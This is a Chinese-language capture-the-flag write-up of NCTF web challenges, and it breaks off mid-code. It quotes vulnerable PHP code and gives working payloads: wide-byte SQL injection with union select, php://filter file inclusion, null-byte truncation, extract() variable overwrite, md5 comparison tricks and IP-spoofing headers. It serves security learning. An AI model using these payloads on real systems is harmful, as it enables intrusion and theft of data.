    <content type="html"><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p><a href="http://chinalover.sinaapp.com/web1/">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106162753668.png" alt="image-20191106162753668"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F12 <span class="comment"># 查看源代码</span></span><br></pre></td></tr></table></figure><h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p><a href="http://chinalover.sinaapp.com/web19/">题目链接</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$md51 = md5(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>此题有关MD5碰撞，哈希相等的问题，详解MD5碰撞看我之前的文章<a href="https://betao.cn/archives/md5same.html">MD5碰撞和MD5值(哈希值)相等</a></p><p>大概就是： 在PHP的数的处理中，0开头的字符串会被转换成0 </p><p>所以我们GET请求<code>a=s878926199a</code>,进行碰撞</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106163458184.png" alt="image-20191106163458184"></p><h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p><a href="http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106163755543.png" alt="image-20191106163755543"></p><p>方式一</p><pre><code>添加输入框的值`value=&quot;zhimakaimen&quot;`,然后点击开门</code></pre><p>方式二</p><pre><code>修改输入框的最大输入长度`maxlength=&#39;11&#39;`，然后在输入框输入zhimakaimen,再提交即可</code></pre><h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p><a href="http://chinalover.sinaapp.com/web2/index.html">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164226710.png" alt="image-20191106164226710"></p><p>下载动图，直接文本方式打开（notepad也ok）</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164324505.png" alt="image-20191106164324505"></p><h4 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h4><p><a href="http://chinalover.sinaapp.com/web3/">题目链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F12 # 查看源代码</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164458500.png" alt="image-20191106164458500"></p><p>访问此页面<code>SO.html</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164611379.png" alt="image-20191106164611379"></p><p>继续F12,访问<code>S0.html</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164647154.png" alt="image-20191106164647154"></p><p>继续访问，<code>SO.htm</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164734181.png" alt="image-20191106164734181"></p><p>继续进入,<code>S0.htm</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164806035.png" alt="image-20191106164806035"></p><p>进入<code>404.html</code>,点击回退就真的回去了(hhh),F12分析一波</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106164905831.png" alt="image-20191106164905831"></p><h2 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h2><p><a href="http://homura.cc/CGfiles/aaencode.txt">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106165147839.png" alt="image-20191106165147839"></p><p>换编码后</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106165244396.png" alt="image-20191106165244396"></p><p>复制，控制台运行，弹出FLAG</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106165337816.png" alt="image-20191106165337816"></p><h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><a href="http://chinalover.sinaapp.com/web8/">题目链接</a></p><p>真的是考验手速的题? 我看未必 Burp抓包</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106165538239.png" alt="image-20191106165538239"></p><h2 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span>(<span class="params">$ZzvSWE</span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"> </span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(CLsI(<span class="string">&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>复制到php文件运行</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106170009458.png" alt="image-20191106170009458"></p><p>将<code>eval</code>改成<code>print_r</code>,因为此函数的执行结果是返回值，所以我们需要打印出来</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106170147915.png" alt="image-20191106170147915"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><a href="http://4.chinalover.sinaapp.com/web7/index.php">题目链接</a></p><p>点击<code>click me? no</code>进入了文件包含页面</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106170323988.png" alt="image-20191106170323988"></p><p>我们可以使用<code>php://filter</code>协议包含<code>index.php</code>文件</p><p><code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106170834158.png" alt="image-20191106170834158"></p><p>将输出的base64加密的密文，进行解码</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106171055082.png" alt="image-20191106171055082"></p><p>文件注释中包含flag</p><h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p><a href="http://chinalover.sinaapp.com/web9/">题目链接</a></p><p>burp又登场了</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106171254297.png" alt="image-20191106171254297"></p><h2 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h2><p>页面无法访问,待更新。。。</p><h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h2><p>修改cookie的值为1，即可</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106171645429.png" alt="image-20191106171645429"></p><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p><a href="http://chinalover.sinaapp.com/web11/">题目链接</a></p><p>访问<code>robots.txt</code>文件</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106171740428.png" alt="image-20191106171740428"></p><p>发现robots.txt中php代码，我们分析一下</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106172108345.png" alt="image-20191106172108345"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">&quot;select content from ctf2 where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 根据以上代码分析，这里是利用intval()函数来绕过，输出flag。因此，url传入id=1024.1</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106172211916.png" alt="image-20191106172211916"></p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">intval() 函数用于获取变量的整数值。</span><br><span class="line"></span><br><span class="line">intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 数值。 intval() 不能用于 <span class="keyword">object</span>，否则会产生 E_NOTICE 错误并返回 <span class="number">1</span>。</span><br><span class="line"></span><br><span class="line">PHP <span class="number">4</span>, PHP <span class="number">5</span>, PHP <span class="number">7</span></span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line"><span class="keyword">int</span> intval ( mixed $var [, <span class="keyword">int</span> $base = <span class="number">10</span> ] )</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">$var：要转换成 <span class="keyword">integer</span> 的数量值。</span><br><span class="line">$base：转化所使用的进制。（默认是十进制）</span><br><span class="line"></span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line">返回值</span><br><span class="line">成功时返回 <span class="keyword">var</span> 的 <span class="keyword">integer</span> 值，失败时返回 <span class="number">0</span>。 空的 <span class="keyword">array</span> 返回 <span class="number">0</span>，非空的 <span class="keyword">array</span> 返回 <span class="number">1</span>。</span><br><span class="line"></span><br><span class="line">最大的值取决于操作系统。 <span class="number">32</span> 位系统最大带符号的 <span class="keyword">integer</span> 范围是 <span class="number">-2147483648</span> 到 <span class="number">2147483647</span>。举例，在这样的系统上， intval(<span class="string">&#x27;1000000000000&#x27;</span>) 会返回 <span class="number">2147483647</span>。<span class="number">64</span> 位系统上，最大带符号的 <span class="keyword">integer</span> 值是 <span class="number">9223372036854775807</span>。</span><br><span class="line"></span><br><span class="line">字符串有可能返回 <span class="number">0</span>，虽然取决于字符串最左侧的字符。</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42.88</span>, <span class="number">8</span>);                <span class="comment">// 42，挑一个详解：这里是先将42.88取整，再将它以8进制转换为10进制</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因此，无论这个intval函数<code>$base</code>用的哪个进制来转换的，都是先将<code>$var</code>取整，再将<code>$var</code>从<code>$base</code>进制转换为10进制</p><h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php">题目链接</a></p><p>访问，需要传<code>id</code>这个参数</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106172640403.png" alt="image-20191106172640403"></p><p> 一下子都想到sql注入，结果会显发现<code>&#39;和&quot;</code>等特殊字符都被转义</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191106172804773.png" alt="image-20191106172804773"></p><p>然后发现可以利用宽字节注入(没有被转义)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107083142890.png" alt="image-20191107083142890"></p><p>先判断字段数<code>?id=1%df&#39; order by 3 %23</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107083725957.png" alt="image-20191107083725957"></p><p>然后我们自定义回显<code>id=1%df&#39; and 1=2 union select 1,2 %23</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107084020450.png" alt="image-20191107084020450"></p><p>我们接下来按照以下步骤</p><ul><li>爆数据库（这里只需要知道当前数据库即可）</li><li>爆表</li><li>爆字段</li><li>查询想要的值</li></ul><p>注：一下操作全在修改自定义回显中体现</p><p>1).查看当前数据库</p><p><code>?id=1%df&#39; and 1=2 union select 1,database() %23</code>，其中<code>database()</code>表示当前数据库名</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107084409642.png" alt="image-20191107084409642"></p><p>2).报表( sae-chinalover这个数据库的表)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107085532993.png" alt="image-20191107085532993"></p><p>注意,因为单引号和双引号被转义了，所以我们不能使用单引号来进行约束。我们可以将<code>sae-chinalover</code>转换为16进制</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107085611068.png" alt="image-20191107085611068"></p><p>注意：<code>7361652d6368696e616c6f766572</code>==<code>sae-chinalover</code>,其中没有引号，0x表示后面的数字是16进制数</p><p>3).通过表( ctf,ctf2,ctf3,ctf4,gbksqli,news )爆字段</p><pre><code>这里呢,因为flag在ctf4中，所以我们只拿一个来举例。其余的方法都大同小异![image-20191107090128927](https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107090128927.png)</code></pre><p>获得两个字段，<code>id,flag</code>,我们直接通过查询输出,<code>?id=1%df&#39; and 1=2 union select 1,group_concat(flag) from ctf4 %23</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107090431094.png" alt="image-20191107090431094"></p><h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php">题目链接</a></p><p>进去就是一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;nctf&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">&quot;^[1-9]+$&quot;</span>, $_GET[<span class="string">&#x27;nctf&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;必须输入数字才行&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">&#x27;nctf&#x27;</span>], <span class="string">&#x27;#biubiubiu&#x27;</span>) !== <span class="literal">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;骚年，继续努力吧啊~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 因为ereg()函数存在NULL截断漏洞，导致正则过滤被绕过，因此我们可以使用00截断 </p><p>我们构造<code>nctf=%00#biubiubiu</code>， 尝试一次，发现失败</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107091052578.png" alt="image-20191107091052578"></p><p>后面才反应过来, ==url中的#后面的字符都会被浏览器解读为位置标识符。因此，这些字符都不会被发送到服务器端，于是，我们需要对#进行url编码==</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107091214463.png" alt="image-20191107091214463"></p><h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><p><a href="http://chinalover.sinaapp.com/web17/index.php">题目链接</a></p><p>又是代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;a&#x27;</span>] != $_GET[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;a&#x27;</span>]) == md5($_GET[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一看代码，就知道了，又是md5值的碰撞问题,参考我之前的文章<a href="https://betao.cn/archives/md5same.html">MD5碰撞和MD5值(哈希值)相等</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107091505130.png" alt="image-20191107091505130"></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><a href="http://chinalover.sinaapp.com/web18/index.php">题目链接</a></p><p>进去一看</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107091810207.png" alt="image-20191107091810207"></p><p>点进去，发现以下代码,分析一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                        <span class="meta">&lt;?php</span></span><br><span class="line">                        extract($_POST);</span><br><span class="line">                        <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                            &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                                &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">                    <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以参考<a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a>，这里主要就是我们可以通过<code>extract()</code>这个函数</p><p> extract()会把符号表中已存在的变量名的值替换掉 ,所以我们通过burp来构造值</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107092353796.png" alt="image-20191107092353796"></p><h2 id="PHP是最好的语言"><a href="#PHP是最好的语言" class="headerlink" title="PHP是最好的语言"></a>PHP是最好的语言</h2><p>无法访问… 待更新</p><h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p><a href="http://chinalover.sinaapp.com/web4/xxx.php">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107092534236.png" alt="image-20191107092534236"></p><p>一看到本地访问，我第一时间就想到了<code>X-Forwarded-For: 127.0.0.1</code>，打开burp，添加字段</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107092718703.png" alt="image-20191107092718703"></p><p>但是很遗憾，在这里行不通，但是我们还可以通过<code>Client-IP:127.0.0.1</code>来伪造</p><p>还有一下几种伪造方式:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Client-IP:<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">X-Remote-IP:<span class="number">2.2</span><span class="number">.2</span><span class="number">.2</span></span><br><span class="line">X-Remote-Addr:<span class="number">3.3</span><span class="number">.3</span><span class="number">.3</span></span><br><span class="line">X-Originating-IP:<span class="number">4.4</span><span class="number">.4</span><span class="number">.4</span></span><br><span class="line">X-Forwarded-<span class="keyword">For</span>:<span class="number">5.5</span><span class="number">.5</span><span class="number">.5</span> </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107093846799.png" alt="image-20191107093846799"></p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>页面无法访问，待更新…</p><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html">题目链接</a></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107094124578.png" alt="image-20191107094124578"></p><p>一个上传文件的页面，我们直接利用<code>%00</code>截断上传</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107094342248.png" alt="image-20191107094342248"></p><p>发现没用，只允许上传图片,然后将文件名改成<code>1.jpg</code>,但是我尝试使用修改hex为00便可以(至今有点迷，不知道为啥)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107094705232.png" alt="image-20191107094705232"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107094512667.png" alt="image-20191107094512667"></p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p><a href="http://chinalover.sinaapp.com/index.php">题目链接</a></p><p>这个题特别简单</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191107094836626.png" alt="image-20191107094836626"></p><p>发现不需要什么猜测，源代码都直接给你，hhh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">Secure Web Login</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">&quot;select user from ctf where (user=&#x27;&quot;</span>.$user.<span class="string">&quot;&#x27;) and (pw=&#x27;&quot;</span>.$pass.<span class="string">&quot;&#x27;)&quot;</span>; <span class="comment">#重点</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.$sql;</span><br><span class="line">  $query = 